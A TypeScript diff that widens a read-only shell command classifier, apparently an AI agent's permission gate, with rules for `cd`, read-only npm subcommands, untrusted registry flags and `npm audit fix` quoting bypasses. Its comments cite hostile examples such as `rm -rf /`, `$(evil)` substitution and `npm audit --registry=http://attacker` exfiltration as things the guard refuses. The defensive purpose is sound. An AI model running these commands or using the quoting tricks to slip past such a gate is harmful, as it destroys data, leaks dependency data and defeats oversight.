@@ -60,6 +60,19 @@
  * Single-token read-only binaries. Each accepts arguments without
  * changing classification: `ls -la /tmp` is still read-only.
  *
+ * `cd` is included here even though it is a shell builtin, not an
+ * external binary — same as `echo`/`true`/`false` already in this set,
+ * the classifier only inspects argv tokens, not builtin-vs-binary
+ * status. `cd` mutates only the invoking shell process's own working
+ * directory; by construction it cannot write to the filesystem or
+ * touch production, and unlike `find`/`sort`/`tree`/`file` it has no
+ * flag whose value is an output path, so no per-bin write-flag guard is
+ * needed. A chained or redirected form (`cd /x && rm -rf /`,
+ * `cd $(evil)`) never reaches this set: the shell-metacharacter /
+ * substitution guard in `isReadOnlyBashCommand` refuses the whole
+ * string before tokenization, so only the bare navigation form (`cd`,
+ * `cd -`, `cd DIR`, with or without `-L`/`-P`) is ever classified here.
+ *
  * Deliberately EXCLUDED because their write vector is not a clean flag:
  *
  * `uniq`: a second positional operand is the output file. Detecting a
@@ -93,6 +106,7 @@ const SIMPLE_READ_ONLY_BINS: ReadonlySet<string> = new Set([
   "basename", "dirname", "realpath", "readlink",
   "less", "more", "cmp", "diff", "comm",
   "cut", "tr", "tac", "rev",
+  "cd",
 ]);
 
 /**
@@ -196,6 +210,79 @@ const HARNESS_READ_ONLY_SUBS: ReadonlySet<string> = new Set([
   "doctor", "validate", "audit", "diff", "list", "version",
   "show", "status", "pause",
 ]);
+
+/**
+ * `npm` subcommands that only inspect the installed tree, the registry,
+ * or the lockfile without writing to `node_modules`, `package.json`,
+ * `package-lock.json`, or the registry: `ls` / `list` (installed
+ * dependency tree), `view` / `info` / `show` (registry metadata — `info`
+ * and `show` are npm's own aliases for `view`), `outdated`, `why` /
+ * `explain` (dependency-reason report — `explain` is `why`'s formal
+ * name), `ping` (registry reachability check).
+ *
+ * Deliberately a curated ALLOWLIST, not a denylist of known-mutating
+ * subcommands (`install`, `ci`, `publish`, `update`, `version`, ...): an
+ * npm verb this floor has not been reasoned about — a new one in a
+ * future npm release, or an existing one simply not enumerated here —
+ * stays unclassified rather than being assumed safe, per the "unknown
+ * is not safe" design contract.
+ *
+ * Only CANONICAL spellings are floored, not every alias npm accepts:
+ * `la` / `ll` (aliases for `ls -la` / `ls -l`) and `v` (alias for `view`)
+ * are deliberately NOT in this set. Widening to cover every alias is a
+ * possible future extension, not required by this floor's goal (an
+ * agent hitting one of those stays gated, not miscategorized as unsafe).
+ *
+ * `audit` is deliberately NOT in this set. `npm audit` alone (the
+ * report) is read-only, but `npm audit fix` mutates the lockfile and
+ * `node_modules`; a single subcommand membership test cannot
+ * distinguish the two, so `audit` gets its own check in
+ * `classifyTokens` instead of joining this allowlist.
+ */
+const NPM_READ_ONLY_SUBS: ReadonlySet<string> = new Set([
+  "ls", "list", "view", "info", "show", "outdated", "why", "explain", "ping",
+]);
+
+/**
+ * npm flags that redirect npm's network/config lookups to an
+ * operator-unverified location: `--registry` (dependency/audit data is
+ * sent to whatever host this names instead of the real registry) and
+ * `--userconfig` / `--globalconfig` (loads npm config — which can itself
+ * set `registry` — from an arbitrary file). Any of these on an otherwise
+ * floored npm subcommand forfeits the read-only classification: `npm
+ * audit --registry=http://attacker` would submit the full dependency
+ * manifest to the named host, which is exfiltration, not a safe read.
+ * Matches the glued (`--registry=URL`) and separate (`--registry URL`)
+ * unscoped forms, and the PER-SCOPE registry override
+ * (`--@scope:registry=URL` / `--@scope:registry URL`, e.g.
+ * `--@myorg:registry=http://attacker`) via `NPM_REGISTRY_FLAG_RE` — npm
+ * resolves a scoped package's registry from `@scope:registry` before the
+ * plain `registry` config, so the scoped form is an equally live
+ * exfiltration vector, not merely a naming variant. `--userconfig` /
+ * `--globalconfig` have no per-scope form; npm has no short-flag spelling
+ * for any of these three.
+ *
+ * HONEST LIMIT: this is a CLI-token guard only. It cannot see (and does
+ * not attempt to close) `registry` set via `.npmrc` (project, user, or
+ * global) or the `npm_config_registry` environment variable — both
+ * redirect npm's registry lookups identically to `--registry` but leave
+ * no trace in the argv this classifier inspects. Do not read this guard
+ * as "npm's registry source is verified"; it only denies the on-the-spot
+ * CLI override.
+ */
+const NPM_REGISTRY_FLAG_RE = /^--(@[^:]+:)?registry(=|$)/;
+const NPM_UNSCOPED_UNTRUSTED_FLAGS: ReadonlySet<string> = new Set([
+  "--userconfig", "--globalconfig",
+]);
+
+function hasNpmUntrustedSourceFlag(tokens: readonly string[]): boolean {
+  return tokens.some(
+    (t) =>
+      NPM_REGISTRY_FLAG_RE.test(t) ||
+      NPM_UNSCOPED_UNTRUSTED_FLAGS.has(t) ||
+      [...NPM_UNSCOPED_UNTRUSTED_FLAGS].some((f) => t.startsWith(`${f}=`)),
+  );
+}
 
 /**
  * Common single-flag read-only invocations: `<bin> --version`,
@@ -464,6 +551,44 @@ function classifyTokens(tokens: readonly string[]): boolean {
   }
 
   if (bin === "harness") return HARNESS_READ_ONLY_SUBS.has(sub);
+
+  if (bin === "npm") {
+    // `--registry` (incl. the per-scope `--@scope:registry` form) /
+    // `--userconfig` / `--globalconfig` redirect npm's network or config
+    // lookups to an operator-unverified location; forfeit the read-only
+    // classification for the whole npm invocation regardless of which
+    // subcommand is used. See `NPM_REGISTRY_FLAG_RE` / `NPM_UNSCOPED_UNTRUSTED_FLAGS`
+    // (and their docstring's stated limit — this is a CLI-token guard only,
+    // it cannot see `.npmrc` or `npm_config_registry`).
+    if (hasNpmUntrustedSourceFlag(tokens.slice(1))) return false;
+
+    // `npm audit` (report) is read-only; `npm audit fix` mutates the
+    // lockfile and node_modules. A token-equality denylist on `fix` is a
+    // shell-quoting bypass waiting to happen: `npm audit "fix"`, `'fix'`,
+    // `f''ix`, `fi"x"`, `$'fix'` all reach npm as the literal argument
+    // `fix` (npm's own arg parsing, not ours, strips the quoting) while
+    // none of those RAW tokens equals the string `"fix"`, so an
+    // equality/`includes` check on the untouched argv silently passes them.
+    // The fix is a POSITIVE shape instead: after `audit`, every remaining
+    // token must either start with `-` (a flag) or be the literal verb
+    // `signatures` (npm's other read-only audit arm); any other positional
+    // token — quoted, glued, or a future subcommand this floor has not
+    // reasoned about — forfeits the classification. This also fails closed
+    // on ANY separated flag value (e.g. `npm audit --audit-level high`,
+    // `npm audit --omit dev` — the value itself, `high` / `dev`, is a
+    // positional token with no leading `-`), an acceptable, conservative
+    // false negative; use the glued `--flag=value` form to stay floored.
+    // Deliberately NOT blocked: `npm audit -fix` (single dash). Verified
+    // npm 11.17.0 behavior: npm's arg parser does not recognize `-fix` as
+    // the `fix` subcommand or as any known flag cluster — it errors
+    // `Unknown cli config "--fix"` and falls back to the plain (read-only)
+    // report. `startsWith("-")` correctly floors it; do not "fix" this into
+    // a block without re-verifying npm's parser first.
+    if (sub === "audit") {
+      return tokens.slice(2).every((t) => t.startsWith("-") || t === "signatures");
+    }
+    return NPM_READ_ONLY_SUBS.has(sub);
+  }
 
   return false;
 }
